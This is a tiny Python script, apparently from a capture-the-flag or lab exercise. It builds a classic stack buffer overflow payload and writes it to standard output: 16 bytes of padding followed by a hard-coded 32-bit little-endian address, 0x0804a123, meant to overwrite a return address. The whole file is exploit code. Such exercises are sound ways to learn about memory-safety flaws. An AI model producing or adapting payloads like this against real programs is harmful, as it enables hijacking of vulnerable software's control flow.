import sys

padding = b"A" * 16

target = (0x0804a123).to_bytes(4, "little")

payload = padding + target

sys.stdout.buffer.write(payload)